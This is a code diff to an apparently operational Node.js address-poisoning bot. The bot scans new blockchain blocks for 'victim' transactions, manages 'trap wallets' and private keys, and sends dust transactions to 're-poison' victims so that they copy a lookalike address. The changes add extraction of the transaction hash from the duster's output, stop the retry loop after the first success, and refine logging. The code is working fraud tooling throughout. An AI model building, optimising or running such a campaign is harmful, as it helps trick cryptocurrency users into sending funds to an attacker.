@@ -271,7 +271,6 @@ function getDynamicCooldown(victimAddress) {
   const timestamps = victimTxTimestamps.get(victimAddress);
   if (!timestamps || timestamps.length < 2) return COOLDOWN_MS;
 
-  // 🚀 OPTIMIZATION: Avoid array creation (reduce/slice) in hot paths
   let sum = 0;
   const len = timestamps.length;
   for (let i = 1; i < len; i++) {
@@ -288,7 +287,6 @@ function getAssetFromTx(tx) {
   if (!tx || !tx.to) return null;
   const to = tx.to.toLowerCase();
   
-  // 🚀 OPTIMIZATION: O(1) Map lookup instead of Object.entries iteration
   const tokenSymbol = tokenAddressMap.get(to);
   if (tokenSymbol) {
     return tokenSymbol;
@@ -316,7 +314,10 @@ async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
     const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
     if (stderr) logger.warn(`duster stderr: ${stderr}`);
     logger.info(`duster stdout: ${stdout.trim()}`);
-    return true;
+    
+    // 🚀 NEW: Extract TX hash from stdout (matches 0x followed by 64 hex chars)
+    const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
+    return txHashMatch ? txHashMatch[0] : true; // Return hash if found, otherwise true for success
   } catch (error) {
     if (error.killed && error.signal === 'SIGTERM') {
       logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
@@ -331,14 +332,26 @@ async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
 async function poisonVictim(victimAddress, privateKey, campaignId, asset = null) {
   logger.info(`Re‑poisoning victim ${victimAddress}...`);
   let successCount = 0;
+  let txHash = null;
+
   for (let i = 0; i < DUST_RETRIES; i++) {
-    const ok = await sendDust(privateKey, victimAddress, campaignId, asset);
-    if (ok) successCount++;
+    const result = await sendDust(privateKey, victimAddress, campaignId, asset);
+    if (result) {
+      successCount++;
+      if (typeof result === 'string' && result.startsWith('0x')) {
+        txHash = result;
+      }
+      // 🚀 OPTIMIZATION: Break early if successful to save time and prevent duplicate attempts
+      break; 
+    }
     if (i < DUST_RETRIES - 1) {
       await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
     }
   }
-  const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}`;
+
+  // 🚀 NEW: Format message to include the TX hash if available
+  const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
+  const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
   logger.info(msg);
 
   try {
@@ -410,7 +423,6 @@ function checkTransaction(tx) {
   }
   timestamps.push(Date.now());
   
-  // 🚀 OPTIMIZATION: shift() is cleaner and uses less memory than slice for maintaining a fixed-size queue
   if (timestamps.length > 10) {
     timestamps.shift();
   }
@@ -418,7 +430,7 @@ function checkTransaction(tx) {
   const dynamicCooldown = getDynamicCooldown(from);
   if (now - entry.lastPoison < dynamicCooldown) return;
 
-  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS: Prevent overlapping poison calls
+  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
   if (trapLocks.get(entry.privateKey)) {
     console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
     return;
@@ -470,7 +482,6 @@ async function scanNewBlocks() {
     );
     
     if (lastBlockProcessed === 0n) {
-      // Start slightly behind to ensure no missed blocks on initial boot
       lastBlockProcessed = currentBlock > 5n ? currentBlock - 5n : 0n;
       console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
       isScanning = false;
@@ -481,7 +492,6 @@ async function scanNewBlocks() {
     let endBlock = currentBlock;
     const blockDiff = Number(endBlock - startBlock);
 
-    // 🚀 OPTIMIZATION: Cap the number of blocks to prevent CPU/RPC meltdowns if the script falls behind
     if (blockDiff > MAX_BLOCKS_PER_SCAN) {
       logger.warn(`Fell behind by ${blockDiff} blocks. Capping scan to latest ${MAX_BLOCKS_PER_SCAN} blocks to prevent CPU/RPC overload.`);
       startBlock = currentBlock - BigInt(MAX_BLOCKS_PER_SCAN) + 1n;
@@ -530,8 +540,6 @@ function startWatcher() {
   })();
 
   blockPollInterval = setInterval(scanNewBlocks, 120000);
-
-  // 🚀 OPTIMIZATION: Poll caught victims every 60 seconds (reduced from 15s to save DB/CPU)
   caughtVictimsPollInterval = setInterval(loadCaughtVictims, 60000);
 
   console.log('[DEBUG] Watcher started.');
@@ -556,7 +564,6 @@ if (loaded === 0) {
   process.exit(1);
 }
 
-// Initial load of caught victims
 await loadCaughtVictims();
 
 console.log('[DEBUG] Starting watcher...');
